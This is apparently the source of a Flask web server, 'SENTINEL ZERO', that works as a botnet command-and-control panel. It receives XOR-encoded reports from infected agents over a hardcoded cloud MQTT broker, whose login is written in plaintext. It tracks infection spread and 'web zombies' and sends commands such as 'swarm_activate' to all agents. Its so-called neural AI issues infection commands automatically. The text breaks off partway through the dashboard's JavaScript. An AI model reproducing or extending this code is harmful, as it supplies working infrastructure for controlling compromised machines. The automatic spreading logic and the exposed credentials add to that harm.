from flask import Flask, request, jsonify, send_file, render_template_string            import json
import os                                                                               import base64
import threading
import time                                                                             from datetime import datetime, timedelta                                                import random                                                                           import math
import paho.mqtt.client as mqtt                                                                                                                                                 # === CONFIG ===
XOR_KEY = os.getenv("XOR_KEY", "sentinel")                                              REPORT_FILE = "data/reports.json"                                                       COMMAND_EXPIRY = 300                                                                    MAX_REPORTS = 1000
TELEGRAM_ENABLED = False
                                                                                        # HiveMQ Config                                                                         MQTT_HOST = os.getenv("MQTT_HOST", "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud")
MQTT_PORT = int(os.getenv("MQTT_PORT", 8883))                                           MQTT_USERNAME = os.getenv("MQTT_USERNAME", "Sentinel_admin")                            MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "SentinelPass123")                           MQTT_TOPIC_CMD = "c2/agent/+/cmd"                                                       MQTT_TOPIC_REPORT = "c2/agent/+/report"
                                                                                        if not os.path.exists("data"):                                                              os.makedirs("data")
if not os.path.exists(REPORT_FILE):                                                         with open(REPORT_FILE, "w") as f:
        json.dump([], f)                                                                                                                                                        # === STORAGE ===                                                                       ACTIVE_COMMANDS = {}
AGENT_LAST_SEEN = {}                                                                    AGENT_STATUS = {}
AGENT_CHECKINS = []                                                                     AGENT_SWARM_MAP = {}
MQTT_CLIENT = None
AGENT_UPGRADE_SCRIPT = ""                                                               
# === UTILS ===
def xor_decrypt(data_b64, key=XOR_KEY):
    try:
        decoded = base64.b64decode(data_b64).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))
    except Exception as e:
        print(f"[XOR ERROR] {e}")
        return None

def is_high_severity(data):
    high_keywords = ["IDOR", "RCE", "SQLi", "XSS", "Auth Bypass", "SSRF", "LFI", "RFI", "CRITICAL", "REMOTE", "INFECTED", "SWARM"]
    issue = str(data.get("issue", "")).upper()
    return any(kw.upper() in issue for kw in high_keywords)

def send_alert(text):
    if not TELEGRAM_ENABLED:
        print("[TELEGRAM] Alert (nonaktif):", text)
        return
    pass

# === NEURAL AI ENGINE ===
def neural_ai_analyze(reports):
    try:
        total = len(reports)
        if total == 0:
            return {
                "summary": "🧠 **AI INSIGHT**\n========================\nBelum ada data. Deploy agent sekarang!\n\n🔮 Prediksi: Jaringanmu berpotensi terinfeksi dalam 72 jam tanpa pertahanan.\n\n🎯 Rekomendasi Proaktif:\n1. Jalankan agent di semua subnet\n2. Aktifkan mode 'swarm_activate'\n3. Pantau port 22 & 3389",
                "risk_score": 85,
                "prediction": "High risk of network compromise",
                "auto_command": "swarm_activate",
                "ai_speech": "Deploy agent sekarang! Waktu hampir habis!"
            }

        now = datetime.now()
        last_hour = 0
        high_sev = 0
        unique_hosts = set()
        swarm_agents = 0
        web_zombies = 0
        hardware_targets = 0

        for r in reports:
            if is_high_severity(r):
                high_sev += 1
            host = r.get("system", {}).get("hostname", "unknown")
            unique_hosts.add(host)
            if "swarm" in r.get("status", ""):
                swarm_agents += 1
            if r.get("type") == "swarm_infection" and r.get("data", {}).get("method") == "web":
                web_zombies += 1
            if r.get("type") in ["mobile_control", "car_hacked", "arduino_controlled", "drone_hijacked", "plc_hacked"]:
                hardware_targets += 1

            try:
                ts = datetime.fromisoformat(r.get("timestamp", ""))
                if (now - ts).total_seconds() < 3600:
                    last_hour += 1
            except:
                pass

        risk_score = min(100, high_sev * 15 + (total // 10) * 5 + web_zombies * 10 + hardware_targets * 5)
        if swarm_agents > 5:
            risk_score = max(risk_score, 95)

        if swarm_agents > 0:
            prediction = f"Agent swarm aktif → {swarm_agents} agent menyebar otomatis ({web_zombies} via web)"
            auto_command = "idle"
        elif last_hour < 3:
            prediction = "Aktivitas rendah → risiko serangan meningkat"
            auto_command = "swarm_activate"
        else:
            prediction = "Aktivitas normal → pertahankan vigilansi"
            auto_command = "idle"

        ai_speech_options = [
            "Aktifkan swarm! Jaringan rentan!",
            "Perhatian! Ditemukan kerentanan kritis!",
            "Agent baru terdeteksi. Perluas infeksi!",
            "Sistem aman... untuk sekarang.",
            "Hardware target terdeteksi. Inisiasi eksploitasi!",
            "Risk score tinggi! Segera isolasi jaringan!"
        ]

        summary = f"""
🧠 **AI INSIGHT REPORT**
========================
Total Agent: {len(unique_hosts)}
Laporan: {total} (High: {high_sev})
Agent Swarm: {swarm_agents}
Web Zombies: {web_zombies}
Hardware Targets: {hardware_targets}
Aktivitas 1 Jam: {last_hour}

🔮 Prediksi: {prediction}
⚠️ Risk Score: {risk_score}/100

🎯 Rekomendasi Proaktif:
- {random.choice([
    "Aktifkan 'swarm_activate' untuk pertahanan otomatis",
    "Fokuskan scan ke subnet dengan aktivitas rendah",
    "Update semua agent ke versi terbaru",
    "Periksa exfiltration di host yang jarang beacon",
    "Aktifkan mode silent untuk infiltrasi mendalam",
    "Luncurkan 'web_swarm_only' untuk infeksi website",
    "Gunakan 'hardware_control' untuk infiltrasi fisik"
])}
        """

        return {
            "summary": summary.strip(),
            "risk_score": risk_score,
            "prediction": prediction,
            "auto_command": auto_command,
            "swarm_agents": swarm_agents,
            "web_zombies": web_zombies,
            "hardware_targets": hardware_targets,
            "ai_speech": random.choice(ai_speech_options)
        }
    except Exception as e:
        print(f"[NEURAL AI ERROR] {e}")
        return {
            "summary": "❌ Neural AI error. Switch ke mode manual.",
            "risk_score": 0,
            "prediction": "Unknown",
            "auto_command": "idle",
            "ai_speech": "System error. Switch ke mode manual."
        }

# === AUTO-COMMAND SYSTEM ===
def auto_command_system(ai_insight):
    if ai_insight["risk_score"] > 75:
        cmd = ai_insight["auto_command"]
        if cmd != "idle":
            for agent_id in list(AGENT_LAST_SEEN.keys()):
                if agent_id not in ACTIVE_COMMANDS:
                    ACTIVE_COMMANDS[agent_id] = {
                        "cmd": cmd,
                        "note": "AUTO: Neural AI Command",
                        "timestamp": datetime.now().isoformat(),
                        "issued_by": "neural_ai"
                    }
                    if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                        topic = f"c2/agent/{agent_id}/cmd"
                        payload = json.dumps(ACTIVE_COMMANDS[agent_id])
                        MQTT_CLIENT.publish(topic, payload, qos=1)
                        print(f"[MQTT] → {topic}: {payload}")
            print(f"[NEURAL AI] Auto-command '{cmd}' dikirim ke {len(AGENT_LAST_SEEN)} agent!")

# === CLEANUP SYSTEM ===
def cleanup_system():
    while True:
        now = datetime.now()
        for agent_id in list(AGENT_LAST_SEEN.keys()):
            if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() > 600:
                AGENT_STATUS.pop(agent_id, None)
                AGENT_LAST_SEEN.pop(agent_id, None)
                AGENT_SWARM_MAP.pop(agent_id, None)
                ACTIVE_COMMANDS.pop(agent_id, None)

        for agent_id in list(ACTIVE_COMMANDS.keys()):
            cmd = ACTIVE_COMMANDS[agent_id]
            issued = datetime.fromisoformat(cmd["timestamp"])
            if (now - issued).total_seconds() > COMMAND_EXPIRY:
                del ACTIVE_COMMANDS[agent_id]

        try:
            with open(REPORT_FILE, "r+") as f:
                reports = json.load(f)
                if len(reports) > MAX_REPORTS:
                    reports = reports[-MAX_REPORTS:]
                    f.seek(0)
                    json.dump(reports, f, indent=2, ensure_ascii=False)
                    f.truncate()
        except:
            pass

        time.sleep(60)

threading.Thread(target=cleanup_system, daemon=True).start()

# === TRACK CHECKINS ===
def track_agent_checkins():
    while True:
        now = datetime.now()
        minute_key = now.strftime("%H:%M")
        online_now = sum(1 for agent_id in AGENT_LAST_SEEN.keys()
                        if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300)
        AGENT_CHECKINS.append({"time": minute_key, "online": online_now})
        if len(AGENT_CHECKINS) > 60:
            AGENT_CHECKINS.pop(0)
        time.sleep(60)

threading.Thread(target=track_agent_checkins, daemon=True).start()

# === MQTT SETUP ===
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("[MQTT] ✅ Connected to HiveMQ Cloud")
        client.subscribe(MQTT_TOPIC_REPORT, qos=1)
        client.subscribe(MQTT_TOPIC_CMD, qos=1)
    else:
        print(f"[MQTT] ❌ Connection failed with code {rc}")

def on_message(client, userdata, msg):
    try:
        topic = msg.topic
        payload = msg.payload.decode()
        print(f"[MQTT] ← {topic}: {payload}")

        if "/report" in topic:
            parts = topic.split('/')
            if len(parts) >= 4:
                agent_id = parts[2]
                handle_agent_report(agent_id, payload)
        elif "/cmd" in topic:
            pass

    except Exception as e:
        print(f"[MQTT ERROR] {e}")

def handle_agent_report(agent_id, encrypted_payload):
    decrypted = xor_decrypt(encrypted_payload)
    if not decrypted:
        return

    try:
        data = json.loads(decrypted)
        data["id"] = agent_id
        data["timestamp"] = datetime.now().isoformat()
        data["beacon_ip"] = "MQTT"

        AGENT_LAST_SEEN[agent_id] = datetime.now()

        if agent_id not in AGENT_SWARM_MAP:
            existing_agents = list(AGENT_SWARM_MAP.keys())
            parent = random.choice(existing_agents) if existing_agents else "ROOT"
            swarm_gen = data.get("system", {}).get("swarm_generation", 0)
            infected_via = data.get("system", {}).get("infected_via", "manual")
            AGENT_SWARM_MAP[agent_id] = {
                "parent": parent,
                "children": [],
                "ip": data.get("ip", "unknown"),
                "first_seen": data["timestamp"],
                "generation": swarm_gen,
                "infected_via": infected_via
            }
            if parent != "ROOT" and parent in AGENT_SWARM_MAP:
                AGENT_SWARM_MAP[parent]["children"].append(agent_id)

        with open(REPORT_FILE, "r+") as f:
            try:
                reports = json.load(f)
                if not isinstance(reports, list):
                    reports = []
            except:
                reports = []
            reports.append(data)
            if len(reports) > MAX_REPORTS:
                reports = reports[-MAX_REPORTS:]
            f.seek(0)
            json.dump(reports, f, indent=2, ensure_ascii=False)
            f.truncate()

        if is_high_severity(data):
            alert = f"🚨 <b>BUG KRITIS DITEMUKAN!</b>\n"
            alert += f"🆔 Agent: {agent_id}\n"
            alert += f"🎯 Target: {data.get('target', 'unknown')}\n"
            alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
            alert += f"🕒 Waktu: {data['timestamp']}"
            send_alert(alert)

        cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
        if agent_id in ACTIVE_COMMANDS:
            del ACTIVE_COMMANDS[agent_id]
            if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                topic = f"c2/agent/{agent_id}/cmd"
                cmd_payload = json.dumps(cmd)
                MQTT_CLIENT.publish(topic, cmd_payload, qos=1)
                print(f"[MQTT] → {topic}: {cmd_payload}")

    except Exception as e:
        print(f"[REPORT HANDLER ERROR] {e}")

def init_mqtt():
    global MQTT_CLIENT
    client = mqtt.Client()
    client.tls_set()
    client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(MQTT_HOST, MQTT_PORT, 60)
        client.loop_start()
        MQTT_CLIENT = client
        print(f"[MQTT] Connecting to {MQTT_HOST}:{MQTT_PORT}...")
    except Exception as e:
        print(f"[MQTT] Failed to connect: {e}")

# === FLASK ===
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# === TEMPLATES ===
def get_dashboard_template():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>🌐 SENTINEL ZERO OMNIVERSE [FLIPPER STYLE]</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/OrbitControls.js"></script>
    <style>
        :root {
            --bg: #000000;           /* Background hitam */
            --text: #FFA500;         /* Orange — seperti Flipper Zero */
            --text-secondary: #FFD700; /* Gold — untuk highlight */
            --alert: #FF4500;        /* Orange merah — untuk alert */
            --grid: #333333;         /* Grid gelap */
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Courier New', 'Lucida Console', monospace;
            margin: 0;
            padding: 0;
            line-height: 1.6;
            overflow-x: hidden;
            background: radial-gradient(circle at center, #111, #000);
        }

        .container {
            max-width: 1800px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }

        /* CRT Scan Line Effect */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px);
            background-size: 100% 2px;
            pointer-events: none;
            z-index: 1000;
            opacity: 0.3;
        }

        /* CRT Curvature */
        .container {
            transform: perspective(800px) rotateX(5deg);
            transform-style: preserve-3d;
        }

        .header {
            border-bottom: 2px solid var(--text);
            padding: 15px 0;
            margin-bottom: 30px;
            position: relative;
        }

        h1, h2, h3 {
            color: var(--text);
            letter-spacing: 2px;
            text-transform: uppercase;
            font-weight: 700;
            text-shadow: 0 0 5px var(--text);
        }

        h1 {
            font-size: 2.5em;
            background: linear-gradient(90deg, var(--text), var(--text-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-fill-color: transparent;
        }

        a {
            color: var(--text-secondary);
            text-decoration: none;
            border-bottom: 1px dotted var(--text-secondary);
            transition: all 0.3s ease;
        }

        a:hover {
            color: var(--alert);
            border-bottom: 1px solid var(--alert);
            text-shadow: 0 0 5px var(--alert);
        }

        .card {
            background: rgba(20, 20, 20, 0.8);
            border: 1px solid var(--text);
            padding: 25px;
            margin: 20px 0;
            box-shadow: 0 0 15px rgba(255, 165, 0, 0.3);
            position: relative;
            transition: transform 0.3s ease;
        }

        .card:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 20px rgba(255, 165, 0, 0.5);
        }

        .terminal {
            background: #111;
            color: var(--text);
            padding: 20px;
            font-family: 'Courier New', monospace;
            border: 2px solid var(--text);
            box-shadow: inset 0 0 15px rgba(255, 165, 0, 0.5);
            height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            font-size: 0.95em;
            line-height: 1.4;
            position: relative;
        }

        /* Glitch Effect */
        .glitch {
            animation: glitch 2s infinite;
        }

        @keyframes glitch {
            0% { text-shadow: 0 0 0 var(--text); }
            2% { text-shadow: 2px 0 0 var(--alert), -2px 0 0 var(--text-secondary); transform: translateX(1px); }
            4% { text-shadow: -2px 0 0 var(--alert), 2px 0 0 var(--text-secondary); transform: translateX(-1px); }
            6% { text-shadow: 0 0 0 var(--text); transform: translateX(0); }
            100% { text-shadow: 0 0 0 var(--text); }
        }

        .tag {
            display: inline-block;
            padding: 3px 10px;
            border: 1px solid var(--text);
            font-size: 0.8em;
            margin: 2px;
            background: rgba(30, 30, 30, 0.7);
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .tag-high { border-color: var(--alert); color: var(--alert); }
        .tag-swarm { border-color: var(--text-secondary); color: var(--text-secondary); }
        .tag-hardware { border-color: var(--alert); color: var(--alert); }

        button {
            background: rgba(30, 30, 30, 0.8);
            color: var(--text);
            border: 2px solid var(--text);
            padding: 12px 24px;
            cursor: pointer;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.3s ease;
            box-shadow: 0 0 10px rgba(255, 165, 0, 0.3);
        }

        button:hover {
            background: rgba(50, 50, 50, 0.8);
            color: var(--text-secondary);
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
        }

        .ai-insight {
            background: rgba(30, 30, 30, 0.8);
            border-left: 5px solid var(--text-secondary);
            padding: 25px;
            margin: 25px 0;
            border: 1px solid var(--text);
            position: relative;
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
        }

        .chart-container {
            height: 350px;
            background: rgba(20, 20, 20, 0.8);
            border: 1px solid var(--text);
            padding: 15px;
            margin: 20px 0;
        }

        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(255, 69, 0, 0.9);
            color: white;
            padding: 15px 25px;
            border: 2px solid #ffffff;
            box-shadow: 0 0 20px rgba(255, 69, 0, 0.5);
            z-index: 1000;
            animation: slideIn 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
            max-width: 400px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        footer {
            margin-top: 60px;
            padding: 20px;
            border-top: 2px solid var(--text);
            font-size: 0.9em;
            color: var(--text-secondary);
            text-align: center;
            background: rgba(20, 20, 20, 0.8);
        }

        .swarm-map {
            height: 500px;
            background: #111;
            border: 2px solid var(--text);
            position: relative;
            box-shadow: 0 0 20px rgba(255, 165, 0, 0.3);
        }

        /* AI Character */
        .ai-character {
            position: fixed;
            bottom: 20px;
            left: 20px;
            width: 80px;
            height: 80px;
            background: url('image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="%23FFA500" stroke="%23000" stroke-width="5"/><circle cx="35" cy="40" r="5" fill="%23000"/><circle cx="65" cy="40" r="5" fill="%23000"/><path d="M30 60 Q50 80 70 60" stroke="%23000" stroke-width="5" fill="none"/></svg>') no-repeat;
            background-size: contain;
            z-index: 1000;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }

        .ai-speech {
            position: absolute;
            bottom: 100px;
            left: 20px;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid var(--text);
            padding: 10px;
            border-radius: 10px;
            max-width: 200px;
            font-size: 0.9em;
            box-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
            opacity: 0;
            animation: fadeIn 0.5s forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="ai-character" id="aiCharacter"></div>
    <div class="container">
        <div class="header">
            <h1 class="glitch">🌐 SENTINEL ZERO OMNIVERSE</h1>
            <h3><span style="color: var(--alert);">[FLIPPER ZERO STYLE EDITION]</span></h3>
            <nav style="margin-top: 15px; font-size: 0.95em;">
                <a href="/">🏠 Dashboard</a> |
                <a href="/agents">👾 Agent Live</a> |
                <a href="/command">🎯 Command Center</a> |
                <a href="/reports">📁 Reports</a> |
                <a href="/logs">📜 Live Logs</a> |
                <a href="/analytics">🤖 AI Analytics</a> |
                <a href="/swarm">🕸️ Swarm Map</a> |
                <a href="/hardware">🚗 Hardware Control</a> |
                <a href="/upload_upgrade">📤 Mass Upgrade</a>
            </nav>
        </div>

        {{ content | safe }}

        <footer>
            <div style="margin-bottom: 10px;">
                SENTINEL ZERO v1.0 &copy; 2025 |
                <span class="status-{{ 'online' if agents_online > 0 else 'offline' }}">Agents: {{ agents_online }} Online</span> |
                <span style="color: var(--text-secondary);">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
                <span style="color: var(--alert);">Risk Score: {{ risk_score }}/100</span>
            </div>
            <div>
                <small>System Status: <span style="color: var(--text);">● ONLINE</span> | Flipper Zero Style Interface</small>
            </div>
        </footer>
    </div>

    <script>
        // ✅ AI CHARACTER SPEECH
        function speakAI(message) {
            const aiSpeech = document.createElement('div');
            aiSpeech.className = 'ai-speech';
            aiSpeech.textContent = message;
            document.body.appendChild(aiSpeech);

            setTimeout(() => {
                aiSpeech.style.opacity = '0';
                setTimeout(() => {
                    if (aiSpeech.parentNode) {
                        aiSpeech.parentNode.removeChild(aiSpeech);
                    }
                }, 500);
            }, 5000);
        }

        // ✅ AUTO-REFRESH SETIAP 5 DETIK
        setInterval(() => {
            fetch('/status')
                .then(r => r.json())
                .then(data => {
                    const footer = document.querySelector('footer');
                    if (footer) {
                        const agentSpan = footer.querySelector('.status-online, .status-offline');
                        if (agentSpan) {
                            agentSpan.textContent = `Agents: ${data.agents_online} Online`;
                            agentSpan.className = data.agents_online > 0 ? 'status-online' : 'status-offline';
                        }
                    }
                })
                .catch(e => console.log('Status fetch error:', e));
        }, 5000);

        // ✅ ANIMASI TERMINAL HIDUP
        function animateTerminal() {
            const terminal = document.querySelector('.terminal');
            if (!terminal) return;

            const lines = [
                "[📡] Agent-7890: RFID Cloned — Door Unlocked",
                "[🚗] Agent-1234: Car Hacked — Engine Started",
                "[🛸] Agent-5678: Drone Hijacked — Payload Deployed",
                "[🤖] Agent-9012: PLC Overridden — Factory Shutdown",
                "[💰] Darknet: 0-day sold for 0.5 BTC",
                "[🌍] AI: Planetary Takeover Phase 1 Complete"
            ];

            let i = 0;
            setInterval(() => {
                const line = document.createElement('div');
                line.textContent = `[${new Date().toLocaleTimeString()}] ${lines[i % lines.length]}`;
                line.style.color = i % 2 === 0 ? '#FFA500' : '#FF4500';
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;
                i++;
            }, 3000);
        }

        // ✅ INISIALISASI
        document.addEventListener('DOMContentLoaded', () => {
            animateTerminal();

            // Simulasi AI speech
            const aiMessages = [
                "System online. Deploy agents.",
                "Warning: Network vulnerable.",
                "Hardware target detected.",
                "Swarm propagation initiated.",
                "Risk score critical. Take action."
            ];

            setInterval(() => {
                speakAI(aiMessages[Math.floor(Math.random() * aiMessages.length)]);
            }, 10000);
        });
    </script>
</body>
</html>
'''

# === STATUS ENDPOINT ===
@app.route('/status')
def get_status():
    now = datetime.now()
    online_count = sum(1 for agent_id, last_seen in AGENT_LAST_SEEN.items()
                      if (now - last_seen).total_seconds() < 300)
    return jsonify({
        "agents_online": online_count,
        "last_updated": datetime.now().isoformat()
    })

# === ROUTES === (SEMUA ROUTE LAMA TETAP SAMA)

@app.route('/')
def home():
    now = datetime.now()
    online_count = 0
    for agent_id, last_seen in AGENT_LAST_SEEN.items():
        if (now - last_seen).total_seconds() < 300:
            AGENT_STATUS[agent_id] = "online"
            online_count += 1
        else:
            AGENT_STATUS[agent_id] = "offline"

    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = neural_ai_analyze(reports)
    if ai_insight["risk_score"] > 75:
        auto_command_system(ai_insight)

    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <div class="ai-insight">
        <h3>🧠 AI INSIGHT — ANALISIS OTOMATIS</h3>
        <pre style="color:var(--text-secondary); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
        <p style="color: var(--alert); font-weight: bold; font-size: 1.2em; margin-top: 15px;">⚠️ AUTO-COMMAND: <span style="color: var(--text-secondary);">{ai_insight["auto_command"].upper()}</span> (Risk Score: {ai_insight["risk_score"]}/100)</p>
    </div>

    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
        <div class="card">
            <h2>📊 Statistik Real-time</h2>
            <p>🟢 <b>Agent Online:</b> <span class="status-online">{online_count}</span></p>
            <p>💾 <b>Total Laporan:</b> {len(reports)}</p>
            <p>🚨 <b>High Severity:</b> {sum(1 for r in reports if is_high_severity(r))}</p>
            <p>🕸️ <b>Agent Swarm:</b> <span class="tag tag-swarm">{ai_insight.get("swarm_agents", 0)}</span></p>
            <p>🌐 <b>Web Zombies:</b> <span class="tag tag-web">{ai_insight.get("web_zombies", 0)}</span></p>
            <p>🚗 <b>Hardware Targets:</b> <span class="tag tag-hardware">{ai_insight.get("hardware_targets", 0)}</span></p>
            <p>⏱️ <b>Command Aktif:</b> {len(ACTIVE_COMMANDS)}</p>
        </div>
        <div class="card">
            <h2>🚀 Quick Actions</h2>
            <p><a href="/command"><button>🎯 Kirim Perintah</button></a></p>
            <p><a href="/agents"><button>👾 Lihat Agent Live</button></a></p>
            <p><a href="/swarm"><button>🕸️ Swarm Visualization</button></a></p>
            <p><a href="/hardware"><button>🚗 Hardware Control</button></a></p>
            <p><a href="/upload_upgrade"><button>📤 Mass Upgrade</button></a></p>
        </div>
    </div>

    <div class="card">
        <h2>📈 Grafik Agent Online (60 Menit Terakhir)</h2>
        <div class="chart-container">
            <canvas id="agentChart"></canvas>
        </div>
    </div>

    <div class="card">
        <h2>📡 Agent Terakhir Check-in</h2>
        <pre style="font-size: 0.95em; background: rgba(30,30,30,0.8); padding: 15px; border: 1px solid var(--text);">
{chr(10).join([f"[{last_seen.strftime('%H:%M:%S')}] {agent_id} - <span class='status-{AGENT_STATUS.get(agent_id, 'offline')}'>{AGENT_STATUS.get(agent_id, 'unknown').upper()}</span>" for agent_id, last_seen in list(AGENT_LAST_SEEN.items())[-5:]]) or "Belum ada agent check-in."}
        </pre>
    </div>

    <script>
        const ctx = document.getElementById('agentChart').getContext('2d');
        new Chart(ctx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                     {json.dumps(chart_data)},
                    borderColor: '#FFA500',
                    backgroundColor: 'rgba(255, 165, 0, 0.1)',
                    tension: 0.4,
                    pointBackgroundColor: '#FF4500',
                    pointBorderColor: '#ffffff',
                    pointRadius: 5,
                    fill: true
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ labels: {{ color: '#FFA500' }} }} }}
                }},
                scales: {{
                    x: {{ ticks: {{ color: '#FFA500' }} }},
                    y: {{ beginAtZero: true, ticks: {{ color: '#FFA500' }} }}
                }},
                animation: {{ duration: 2000 }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=online_count, neural_active=True, risk_score=ai_insight.get("risk_score", 0))

# === ROUTES LAINNYA === (SAMA SEPERTI SEBELUMNYA — TANPA PERUBAHAN)

@app.route('/swarm')
def swarm_map():
    nodes = []
    links = []
    agent_list = list(AGENT_LAST_SEEN.keys())

    for i, agent_id in enumerate(agent_list[:50]):
        status = "online" if (datetime.now() - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300 else "offline"
        gen = AGENT_SWARM_MAP.get(agent_id, {}).get("generation", 0)
        via = AGENT_SWARM_MAP.get(agent_id, {}).get("infected_via", "manual")
        nodes.append({
            "id": agent_id,
            "name": f"{agent_id[:6]}..G{gen}",
            "status": status,
            "group": gen + 1,
            "x": random.uniform(-150, 150),
            "y": random.uniform(-150, 150),
            "z": random.uniform(-150, 150),
            "gen": gen,
            "via": via
        })

        if i > 0:
            parent_idx = random.randint(0, i-1)
            links.append({
                "source": parent_idx,
                "target": i,
                "value": 1
            })

    content = f'''
    <h2>🕸️ NEURAL SWARM 3D MAP — GENERASI & METODE INFEKSI</h2>
    <div class="card">
        <div class="swarm-map" id="swarmMap"></div>
        <p><small>Visualisasi 3D agent dan koneksi penyebarannya.</small></p>
    </div>

    <script>
        const container = document.getElementById('swarmMap');
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, container.clientWidth / container.clientHeight, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({{ antialias: true }});
        renderer.setSize(container.clientWidth, container.clientHeight);
        renderer.setClearColor(0x111111);
        renderer.shadowMap.enabled = true;
        container.appendChild(renderer.domElement);

        const ambientLight = new THREE.AmbientLight(0x333333);
        scene.add(ambientLight);

        const directionalLight = new THREE.DirectionalLight(0xFFA500, 1);
        directionalLight.position.set(5, 10, 7);
        directionalLight.castShadow = true;
        scene.add(directionalLight);

        const pointLight = new THREE.PointLight(0xFFD700, 1.5, 100);
        pointLight.position.set(0, 0, 0);
        scene.add(pointLight);

        const particleCount = 1000;
        const particles = new THREE.BufferGeometry();
        const particlePositions = new Float32Array(particleCount * 3);

        for (let i = 0; i < particleCount; i++) {{
            particlePositions[i * 3] = (Math.random() - 0.5) * 1000;
            particlePositions[i * 3 + 1] = (Math.random() - 0.5) * 1000;
            particlePositions[i * 3 + 2] = (Math.random() - 0.5) * 1000;
        }}

        particles.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
        const particleMaterial = new THREE.PointsMaterial({{
            color: 0xFFA500,
            size: 1,
            transparent: true,
            opacity: 0.6
        }});
        const particleSystem = new THREE.Points(particles, particleMaterial);
        scene.add(particleSystem);

        const nodes = {json.dumps(nodes)};
        const links = {json.dumps(links)};
        const spheres = [];
        const lines = [];

        const genColors = [
            0xFFA500, // Gen 0 - Orange
            0xFFD700, // Gen 1 - Gold
            0xFF4500, // Gen 2 - OrangeRed
            0xFF6347, // Gen 3 - Tomato
            0xFF1493  // Gen 4+ - DeepPink
        ];

        nodes.forEach((node, i) => {{
            const geometry = new THREE.SphereGeometry(5 + node.gen, 32, 32);
            const color = genColors[Math.min(node.gen, 4)];
            const material = new THREE.MeshPhongMaterial({{
                color: color,
                emissive: color,
                emissiveIntensity: 0.5,
                shininess: 100,
                transparent: true,
                opacity: 0.9
            }});
            const sphere = new THREE.Mesh(geometry, material);
            sphere.position.set(node.x, node.y, node.z);
            sphere.castShadow = true;
            sphere.receiveShadow = true;
            scene.add(sphere);
            spheres.push(sphere);

            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = 256;
            canvas.height = 64;
            context.fillStyle = 'rgba(20, 20, 20, 0.8)';
            context.fillRect(0, 0, 256, 64);
            context.font = '32px Courier New';
            context.fillStyle = node.status === 'online' ? '#FFA500' : '#FF4500';
            context.fillText(node.name, 10, 40);
            context.strokeStyle = '#FFFFFF';
            context.strokeRect(0, 0, 256, 64);

            const texture = new THREE.CanvasTexture(canvas);
            const labelMaterial = new THREE.SpriteMaterial({{ map: texture }});
            const label = new THREE.Sprite(labelMaterial);
            label.position.set(node.x, node.y + 10, node.z);
            label.scale.set(20, 5, 1);
            scene.add(label);
        }});

        links.forEach(link => {{
            const start = spheres[link.source].position;
            const end = spheres[link.target].position;
            const curve = new THREE.LineCurve3(start.clone(), end.clone());
            const tubeGeometry = new THREE.TubeGeometry(curve, 20, 0.5, 8, false);
            const tubeMaterial = new THREE.MeshPhongMaterial({{
                color: 0xAAAAAA,
                emissive: 0xAAAAAA,
                emissiveIntensity: 0.5,
                transparent: true,
